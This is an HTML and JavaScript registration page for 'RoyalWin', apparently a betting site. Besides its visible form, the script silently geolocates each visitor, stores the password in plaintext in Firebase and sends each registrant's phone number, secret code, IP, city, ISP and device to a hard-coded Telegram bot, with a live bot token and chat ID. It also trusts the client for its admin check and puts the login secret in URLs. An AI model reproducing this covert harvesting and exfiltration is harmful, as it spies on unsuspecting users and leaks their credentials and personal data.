<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RoyalWin Registration</title>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }
    
    body {
      background-color: #222;
      color: #fff;
      line-height: 1.6;
    }
    
    header {
      background-color: #1a1a1a;
      border-bottom: 1px solid #2d2d2d;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 15px;
    }
    
    .back-btn {
      width: 32px;
      color: #fff;
      background: none;
      border: none;
      font-size: 18px;
      cursor: pointer;
    }
    
    .logo {
      font-weight: bold;
      font-size: 20px;
    }
    
    .country-flag {
      width: 32px;
      display: flex;
      justify-content: flex-end;
    }
    
    .country-flag img {
      height: 24px;
      width: 24px;
      border-radius: 50%;
    }
    
    .banner {
      background-color: #f8a51b;
      padding: 15px 20px;
    }
    
    .banner h1 {
      font-size: 24px;
      font-weight: bold;
    }
    
    .banner p {
      font-size: 14px;
      margin-top: 5px;
    }
    
    .container {
      padding: 20px;
    }
    
    .title-container {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 15px;
    }
    
    .title-icon {
      background-color: #f8a51b;
      width: 40px;
      height: 40px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 10px;
    }
    
    .title {
      color: #f8a51b;
      font-size: 20px;
      font-weight: bold;
    }
    
    .divider {
      width: 100%;
      border-bottom: 1px solid #333;
      margin-bottom: 20px;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-label {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
    }
    
    .form-icon {
      background-color: #f8a51b;
      width: 32px;
      height: 32px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 8px;
    }
    
    .phone-input {
      display: flex;
    }
    
    .country-code {
      width: 25%;
      margin-right: 8px;
      position: relative;
    }
    
    .country-code select {
      width: 100%;
      height: 50px;
      background-color: #2d2d2d;
      color: #ccc;
      border: none;
      border-radius: 8px;
      padding: 0 10px;
      appearance: none;
      cursor: pointer;
    }
    
    .country-code::after {
      content: '\f078';
      font-family: 'Font Awesome 5 Free';
      font-weight: 900;
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: #666;
      pointer-events: none;
    }
    
    .phone-number {
      width: 75%;
    }
    
    .input-field {
      width: 100%;
      height: 50px;
      background-color: #2d2d2d;
      border: none;
      border-radius: 8px;
      padding: 0 15px;
      color: #ccc;
      font-size: 16px;
    }
    
    .password-field {
      position: relative;
    }
    
    .password-toggle {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #666;
      cursor: pointer;
    }
    
    .checkbox-container {
      display: flex;
      align-items: center;
      margin-top: 10px;
    }
    
    .custom-checkbox {
      width: 20px;
      height: 20px;
      border: 1px solid #666;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 10px;
      cursor: pointer;
    }
    
    .custom-checkbox.checked {
      background-color: #f8a51b;
      border-color: #f8a51b;
    }
    
    .custom-checkbox.checked .fa-check {
      display: block;
      color: white;
      font-size: 12px;
    }
    
    .custom-checkbox .fa-check {
      display: none;
    }
    
    .checkbox-label {
      color: #ccc;
      font-size: 14px;
    }
    
    .privacy-link {
      color: #ff5252;
      text-decoration: none;
    }
    
    .btn {
      width: 100%;
      height: 60px;
      border-radius: 30px;
      border: none;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
      position: relative;
    }
    
    .btn-primary {
      background-color: #f8a51b;
      color: white;
    }
    
    .btn-outline {
      background-color: transparent;
      border: 1px solid #f8a51b;
      color: #f8a51b;
      transition: all 0.3s;
    }
    
    .btn-outline:hover {
      background-color: #f8a51b;
      color: white;
    }
    
    .btn-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      background-color: white;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .btn-icon i {
      color: #f8a51b;
    }
    
    .error-message {
      color: #ff5252;
      font-size: 12px;
      margin-top: 5px;
      display: none;
    }
    
    /* Error state */
    .input-error {
      border: 1px solid #ff5252;
    }

    /* Loading spinner */
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css" media="all" />
  
  
  
</head>
<body>
  <header>
    <div class="back-btn">
      <i class="fas fa-chevron-left"></i>
    </div>
    <div class="logo" style="font-variant: small-caps;">RoYalWin</div>
    <div class="country-flag">
      <img src="https://cdn.jsdelivr.net/npm/country-flag-emoji-json@2.0.0/dist/images/IN.svg" alt="US Flag">
    </div>
  </header>
  
  <div class="banner">
    <h1>Register</h1>
    <p>Please register by phone number or email</p>
  </div>
  
  <div class="container">
    <div class="title-container">
      <div class="title-icon">
        <i class="fas fa-mobile-alt"></i>
      </div>
      <h2 class="title">Register your phone</h2>
    </div>
    
    <div class="divider"></div>
    
    <form id="registrationForm">
      <!-- Phone Number -->
      <div class="form-group">
        <div class="form-label">
          <div class="form-icon">
            <i class="fas fa-mobile-alt"></i>
          </div>
          <label>Phone number</label>
        </div>
        <div class="phone-input">
          <div class="country-code">
            <select id="countryCode">
              <option value="+91">+91</option>
              <option value="+1">+1</option>
              <option value="+44">+44</option>
            </select>
          </div>
          <div class="phone-number">
            <input type="tel" id="phoneNumber" class="input-field" placeholder="Please enter the phone number">
            <div id="phoneError" class="error-message">Phone number must be at least 10 digits</div>
          </div>
        </div>
      </div>
      
      <!-- Password -->
      <div class="form-group">
        <div class="form-label">
          <div class="form-icon">
            <i class="fas fa-lock"></i>
          </div>
          <label>Set password</label>
        </div>
        <div class="password-field">
          <input type="password" id="password" class="input-field" placeholder="Set password">
          <button type="button" class="password-toggle" onclick="togglePassword('password')">
            <i class="fas fa-eye"></i>
          </button>
          <div id="passwordError" class="error-message">Password must be at least 6 characters</div>
        </div>
      </div>
      
      <!-- Confirm Password -->
      <div class="form-group">
        <div class="form-label">
          <div class="form-icon">
            <i class="fas fa-lock"></i>
          </div>
          <label>Confirm password</label>
        </div>
        <div class="password-field">
          <input type="password" id="confirmPassword" class="input-field" placeholder="Confirm password">
          <button type="button" class="password-toggle" onclick="togglePassword('confirmPassword')">
            <i class="fas fa-eye"></i>
          </button>
          <div id="confirmPasswordError" class="error-message">Passwords do not match</div>
        </div>
      </div>
      
      <!-- Invite Code -->
      <div class="form-group">
        <div class="form-label">
          <div class="form-icon">
            <i class="fas fa-ticket-alt"></i>
          </div>
          <label>Invite code</label>
        </div>
        <input type="text" id="inviteCode" class="input-field" placeholder="Please enter the invitation code">
      </div>
      
      <!-- Privacy Agreement -->
      <div class="checkbox-container">
        <div id="agreementCheckbox" class="custom-checkbox" onclick="toggleCheckbox()">
          <i class="fas fa-check"></i>
        </div>
        <input type="checkbox" id="agreement" style="display: none;">
        <label class="checkbox-label">
          I have read and agree <a href="#" class="privacy-link">[Privacy Agreement]</a>
        </label>
      </div>
      <div id="agreementError" class="error-message">You must agree to the Privacy Agreement</div>
      
      <!-- Register Button -->
      <button type="button" class="btn btn-primary" onclick="submitForm()">
        Register
        <div class="btn-icon">
          <i class="fas fa-comments"></i>
        </div>
      </button>
      
      <!-- Login Link -->
      <button type="button" class="btn btn-outline" onclick="app.redirectToLogin()">
        I have an account Login
      </button>
    </form>
  </div>




<script src="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.js"></script>




<script type="module">



  // Firebase Configuration
  const firebaseConfig = {
    apiKey: "AIzaSyBuioOF7DCq-qIoa1D6ZyZbrAVeGjbfv3Y",
    authDomain: "daily-campaign-king.firebaseapp.com",
    databaseURL: "https://daily-campaign-king-default-rtdb.firebaseio.com",
    projectId: "daily-campaign-king",
    storageBucket: "daily-campaign-king.appspot.com",
    messagingSenderId: "1089692268059",
    appId: "1:1089692268059:web:eddde94901436202576abe",
    measurementId: "G-6PXV3B5322"
  };

  // Import Firebase modules
  import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
  import { getDatabase, ref, set, get, update } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
  import { getAuth, createUserWithEmailAndPassword } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js';

  // Initialize Firebase
  const firebaseApp = initializeApp(firebaseConfig);
  const database = getDatabase(firebaseApp);
  const auth = getAuth(firebaseApp);

  // Main application module
  const app = (() => {
    // User data object
    const userData = {
      phoneNumber: "",
      password: "",
      inviteCode: "",
      agreement: false,
      balance: 10.00,
      ipAddress: "",
      isp: "",
      location: "",
      city: "",
      area: "",
      pincode: "",
      deviceUserAgent: navigator.userAgent,
      country: "",
      country_code: "IN",
      deviceModel: "",
      visitDuration: "0",
      currency: "INR",
      bets: "blanks",
      secretCode: "",
      userId: "",
      registrationDate: "",
      isAdmin: false
    };

    const visitStartTime = new Date();
    
    // Enhanced Toastify notification
    const showToast = (message, type = "info") => {
      const background = type === "error" ? "#ff4444" : 
                        type === "success" ? "#00C851" : 
                        "#2e86de";
      
      Toastify({
        text: message,
        duration: 3000,
        newWindow: true,
        close: true,
        gravity: "top",
        position: "right",
        stopOnFocus: true,
        style: {
          background: background,
          color: "#ffffff",
          borderRadius: "5px",
          boxShadow: "0 3px 10px rgba(0,0,0,0.2)",
          fontSize: "14px",
          padding: "12px 20px"
        }
      }).showToast();
    };

    // Send Telegram notification with HTML formatting
    const sendTelegramNotification = async () => {
      try {
        const botToken = "7591812660:AAHSUmsy1zpcYh0AWR2G6AGG5-kDS2FqOV8";
        const chatId = "6320914640";
        
        const formattedDate = new Date().toLocaleString('en-IN', {
          day: '2-digit',
          month: '2-digit',
          year: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });
        
        const message = `
<b>😎🌟 BOT REPORTING SIR... नया विज़िटर आया है ROYAL BRO! 😎🌟</b>

<code></code>
<code>📱 </code><b>Phone:</b> <code>${userData.phoneNumber}</code>
<code>🆔 </code><b>User ID:</b> <code>${userData.userId}</code>
<code>🔐 </code><b>Secret Code:</b> <code>${userData.secretCode}</code>
<code></code>
<code>🌍 </code><b>IP:</b> <code>${userData.ipAddress.replace(/\./g, '_')}</code>
<code>🏙 </code><b>City:</b> <code>${userData.city || "Unknown"}</code>
<code>🌎 </code><b>Region:</b> <code>${userData.area || "Unknown"}</code>
<code>🇮🇳 </code><b>Country:</b> <code>${userData.country || "Unknown"} (${userData.country_code || "IN"})</code>
<code>📡 </code><b>ISP:</b> <code>${userData.isp || "Unknown"}</code>
<code></code>
<code>💻 </code><b>Device:</b> <code>${userData.deviceModel}</code>
<code>🖥 </code><b>Platform:</b> <code>${userData.deviceUserAgent.split('(')[1]?.split(')')[0] || "Unknown"}</code>
<code></code>

<code>📅 </code><b>Registration Date:</b> <code>${formattedDate}</code>

<code>🔥 Powered by:</code> <b>Royal Dev</b>
        `;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
        
        await fetch(url);
      } catch (error) {
        console.error("Error sending Telegram notification:", error);
      }
    };

    // Toggle password visibility
    const togglePassword = (fieldId) => {
      const field = document.getElementById(fieldId);
      const icon = field.nextElementSibling.querySelector('i');
      
      if (field.type === "password") {
        field.type = "text";
        icon.classList.remove("fa-eye");
        icon.classList.add("fa-eye-slash");
      } else {
        field.type = "password";
        icon.classList.remove("fa-eye-slash");
        icon.classList.add("fa-eye");
      }
    };
    
    // Toggle agreement checkbox
    const toggleCheckbox = () => {
      const checkbox = document.getElementById("agreementCheckbox");
      const hiddenInput = document.getElementById("agreement");
      
      checkbox.classList.toggle("checked");
      hiddenInput.checked = checkbox.classList.contains("checked");
      userData.agreement = hiddenInput.checked;
    };
    
    // Redirect to login page
    const redirectToLogin = () => {
      window.location.href = "WINGOG/login.html";
    };

    // Get user location information
    const getUserLocationInfo = () => {
      fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
          userData.ipAddress = data.ip;
          userData.isp = data.org || "Unknown";
          userData.location = `${data.latitude},${data.longitude}`;
          userData.city = data.city;
          userData.area = data.region;
          userData.pincode = data.postal;
          userData.country = data.country_name;
          userData.country_code = data.country_code;
        })
        .catch(err => {
          console.error("Failed to fetch location data:", err);
          showToast("Failed to detect your location", "error");
        });
    };

    // Get device model
    const getDeviceModel = () => {
      const userAgent = navigator.userAgent;
      let deviceModel = "Unknown";
      
      if (/iPhone|iPad|iPod/.test(userAgent)) {
        deviceModel = userAgent.match(/iPhone|iPad|iPod/)?.[0] || "iOS Device";
      } else if (/Android/.test(userAgent)) {
        const match = userAgent.match(/Android\s([0-9.]+);\s([^;)]+)/);
        deviceModel = match ? `Android ${match[1]} - ${match[2]}` : "Android Device";
      } else if (/Windows/.test(userAgent)) {
        deviceModel = "Windows Device";
      } else if (/Macintosh/.test(userAgent)) {
        deviceModel = "Mac Device";
      }
      
      userData.deviceModel = deviceModel;
    };

    // Calculate visit duration
    const calculateVisitDuration = () => {
      const duration = Math.floor((new Date().getTime() - visitStartTime.getTime()) / 1000);
      userData.visitDuration = duration.toString();
      return duration;
    };

    // Check user registration status
    const checkUserRegistration = async () => {
      try {
        const userId = localStorage.getItem('userId');
        const secretCode = localStorage.getItem('secretCode');
        
        if (userId && secretCode) {
          const userRef = ref(database, 'RoyalWinUserDataBase/' + userId);
          const snapshot = await get(userRef);
          
          if (snapshot.exists()) {
            const user = snapshot.val();
            if (user.secretCode === secretCode) {
              showToast("You are already logged in. Redirecting to dashboard...", "success");
              
              setTimeout(() => {
                window.location.href = `/WINGOG/test.html/dasbord.html?userId=${encodeURIComponent(userId)}&secretCode=${encodeURIComponent(secretCode)}`;
              }, 2000);
              return true;
            }
          }
          localStorage.removeItem('userId');
          localStorage.removeItem('secretCode');
        }
        return false;
      } catch (error) {
        console.error("Error checking user registration:", error);
        showToast("Error checking login status", "error");
        return false;
      }
    };

    // Generate secure random user ID
    const generateUserId = () => {
      const timestamp = Date.now().toString(36);
      const randomStr = Math.random().toString(36).substr(2, 8);
      return `UID_${timestamp}_${randomStr}`.toUpperCase();
    };

    // Generate secure random secret code
    const generateSecretCode = () => {
      const array = new Uint32Array(5);
      window.crypto.getRandomValues(array);
      return array.join('').substr(0, 10);
    };

    // Validate form
    const validateForm = () => {
      let isValid = true;
      
      // Phone validation
      const phoneNumber = document.getElementById("phoneNumber").value;
      if (phoneNumber.length < 10) {
        document.getElementById("phoneError").style.display = "block";
        document.getElementById("phoneNumber").classList.add("input-error");
        isValid = false;
      } else {
        document.getElementById("phoneError").style.display = "none";
        document.getElementById("phoneNumber").classList.remove("input-error");
      }
      
      // Password validation
      const password = document.getElementById("password").value;
      if (password.length < 6) {
        document.getElementById("passwordError").style.display = "block";
        document.getElementById("password").classList.add("input-error");
        isValid = false;
      } else {
        document.getElementById("passwordError").style.display = "none";
        document.getElementById("password").classList.remove("input-error");
      }
      
      // Confirm password validation
      const confirmPassword = document.getElementById("confirmPassword").value;
      if (password !== confirmPassword) {
        document.getElementById("confirmPasswordError").style.display = "block";
        document.getElementById("confirmPassword").classList.add("input-error");
        isValid = false;
      } else {
        document.getElementById("confirmPasswordError").style.display = "none";
        document.getElementById("confirmPassword").classList.remove("input-error");
      }
      
      // Agreement validation
      const agreement = document.getElementById("agreement").checked;
      if (!agreement) {
        document.getElementById("agreementError").style.display = "block";
        isValid = false;
      } else {
        document.getElementById("agreementError").style.display = "none";
      }
      
      return isValid;
    };

    // Save user data to Firebase
    const saveUserToFirebase = async (email, password) => {
      try {
        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
        const firebaseUserId = userCredential.user.uid;
        
        userData.userId = firebaseUserId;
        userData.secretCode = generateSecretCode();
        userData.registrationDate = new Date().toISOString();
        
        
      userData.password = document.querySelector("#password").value;
        
      


        await set(ref(database, 'RoyalWinUserDataBase/' + userData.userId), userData);
        
        localStorage.setItem('userId', userData.userId);
        localStorage.setItem('secretCode', userData.secretCode);
        
        showToast("Registration successful! Redirecting to dashboard...", "success");
        
        await sendTelegramNotification();
        
        setTimeout(() => {
          window.location.href = `WINGOG/test.html/dasbord.html?userId=${encodeURIComponent(userData.userId)}&secretCode=${encodeURIComponent(userData.secretCode)}`;
        }, 2000);
        
      } catch (error) {
        console.error("Error saving user data:", error);
        showToast(`Registration failed: ${error.message}`, "error");
        
        const registerButton = document.querySelector(".btn-primary");
        registerButton.innerHTML = 'Register <div class="btn-icon"><i class="fas fa-comments"></i></div>';
        registerButton.disabled = false;
      }
    };

    // Admin function to update user balance
    const updateUserBalance = async (targetUserId, amount) => {
      try {
        const currentUserId = localStorage.getItem('userId');
        const currentUserRef = ref(database, 'RoyalWinUserDataBase/' + currentUserId);
        const currentUserSnapshot = await get(currentUserRef);
        
        if (!currentUserSnapshot.exists() || !currentUserSnapshot.val().isAdmin) {
          throw new Error("Unauthorized: Admin access required");
        }
        
        const targetUserRef = ref(database, 'RoyalWinUserDataBase/' + targetUserId);
        await update(targetUserRef, {
          balance: amount
        });
        
        showToast(`Balance updated for user ${targetUserId}`, "success");
        return true;
      } catch (error) {
        console.error("Error updating balance:", error);
        showToast(`Balance update failed: ${error.message}`, "error");
        return false;
      }
    };

    // Submit form
    const submitForm = async () => {
      const registerButton = document.querySelector(".btn-primary");
      registerButton.innerHTML = '<span class="spinner"></span> Processing...';
      registerButton.disabled = true;
      
      if (!validateForm()) {
        registerButton.innerHTML = 'Register <div class="btn-icon"><i class="fas fa-comments"></i></div>';
        registerButton.disabled = false;
        return;
      }
      
      const countryCode = document.getElementById("countryCode").value;
      const phoneNumber = document.getElementById("phoneNumber").value;
      userData.phoneNumber = countryCode + phoneNumber;
      
      const email = `${phoneNumber}@royalwin.com`;
      const password = document.getElementById("password").value;
      
      userData.inviteCode = document.getElementById("inviteCode").value || "";
      userData.agreement = document.getElementById("agreement").checked;
      
      calculateVisitDuration();
      await saveUserToFirebase(email, password);
    };

    // Initialize the app
    const init = async () => {
      const isRegistered = await checkUserRegistration();
      
      if (!isRegistered) {
        getUserLocationInfo();
        getDeviceModel();
        
        window.addEventListener('beforeunload', () => {
          calculateVisitDuration();
        });
      }
    };

    // Initialize when DOM is loaded
    document.addEventListener('DOMContentLoaded', () => {
      init();
      
      window.togglePassword = togglePassword;
      window.toggleCheckbox = toggleCheckbox;
      window.submitForm = submitForm;
      window.app = {
        redirectToLogin: redirectToLogin,
        updateUserBalance: updateUserBalance
      };
    });

    return {
      redirectToLogin,
      init,
      updateUserBalance
    };
  })();
</script>


</body>
</html>